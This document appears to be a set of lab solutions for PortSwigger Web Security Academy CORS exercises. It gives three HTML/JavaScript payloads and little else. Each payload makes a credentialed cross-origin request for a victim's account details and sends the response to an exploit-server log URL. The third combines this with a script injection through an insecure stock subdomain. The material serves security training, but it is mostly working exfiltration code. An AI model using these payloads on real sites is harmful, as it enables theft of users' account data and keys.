### CORS vulnerability with basic origin reflection
**Payload** :
```html
<html>
    <body>
        <script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('get','https://0ac000d704421f448096035500f6009d.web-security-academy.net/accountDetails',true);
            req.withCredentials = true;
            req.send();
            function reqListener() {
                location='/log?key='+this.responseText;
            };
        </script>
    </body>
</html>
```

### CORS vulnerability with trusted null origin
**Payload** :
```html
<html>
    <body>
        <iframe style="display: none;" sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
            <script>
                var req = new XMLHttpRequest();
                req.onload = reqListener;
                req.open('get','https://0a45003403557f95812a4d3100430083.web-security-academy.net/accountDetails',true);
                req.withCredentials = true;
                req.send();
                function reqListener() {
                location='exploit-0acd002403497f37814c4c0001aa005c.exploit-server.net//log?key='+this.responseText;
                };
            </script>">
        </iframe>
    </body>
</html>
```

### CORS vulnerability with trusted insecure protocols
**Payload** :
```html
<script>
    document.location="http://stock.0a16002a040df69380f00da000360013.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a16002a040df69380f00da000360013.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a4300bb047bf62480b30c6b01520086.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

